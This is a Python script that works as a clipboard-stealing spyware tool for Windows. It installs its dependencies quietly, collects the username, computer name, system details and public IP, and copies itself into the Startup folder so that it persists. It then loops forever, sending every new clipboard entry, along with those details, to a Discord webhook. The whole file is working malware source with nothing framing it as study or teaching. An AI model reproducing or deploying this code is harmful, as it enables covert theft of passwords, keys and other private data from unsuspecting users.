import os
import shutil
import platform
import subprocess

# Auto Install module

try:
    import requests
except ImportError:
    subprocess.run(["pip", "install", "requests"])
    import requests
    
try:
    import psutil
except ImportError:
    subprocess.run(["pip", "install", "psutil"])
    import psutil
    
try:
    import pyperclip
except ImportError:
    subprocess.run(["pip", "install", "pyperclip"])
    import pyperclip
    
#Webhook Url & avatar Url

webhook_url = "WEBHOOK URL"
avatar_url = "https://i.imgur.com/K4PWV8d.jpg"

# Info pc

system = platform.system()
version = platform.version()
total = psutil.virtual_memory().total
total = float(total) / 1024**3
total = round(total,3)
total = str(total) + "Go"
used = psutil.virtual_memory().used
used = float(used) / 1024**3
used = round(used,3)
used = str(used) + "Go"
computername = os.environ['COMPUTERNAME']
cpu = str(psutil.cpu_count()) + "%"
username = os.getlogin()

information = {
  "content": "",
  "embeds": [
    {
      "title": "Information",
      "color": 55039,
      "fields": [
        {
          "name": "📁 • OS",
          "value": system,
          "inline": "true"
        },
        {
          "name": "🏷️ • Username",
          "value": username,
          "inline": "true"
        },
        {
          "name": "💻 • Computer Name",
          "value": computername,
          "inline": "true"
        },
        {
          "name": "💾 • Memory Used",
          "value": used,
          "inline": "true"
        },
        {
          "name": "💾 • Memory Total",
          "value": total,
          "inline": "true"
        },
        {
          "name": "📟 • Process",
          "value": cpu,
          "inline": "true"
        }
      ]
    }
  ],
  "username": username,
  "avatar_url": avatar_url,
  "attachments": []
}

startup_folder = os.path.join(os.environ["HOMEDRIVE"], os.environ["HOMEPATH"], "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
file = __file__

shutil.copy(file, startup_folder)


ip = requests.get('https://api.ipify.org').text
old_content = ""

while True:
    content = pyperclip.paste()
    if content != old_content:
        data = {
  "content": "",
  "embeds": [
    {
      "title": "✂️ • Nouveau Presse-Papier",
      "description": "`" + content + "`",
      "color": 16525095,
      "footer": {
        "text": "🌐 • IP : " + ip
      }
    }
  ],
  "username": username,
  "avatar_url": avatar_url,
  "attachments": []
}
        
        infosend = requests.post(webhook_url, json=information)
        information = ""
        infosend = ""
        response = requests.post(webhook_url, json=data)
        old_content = content
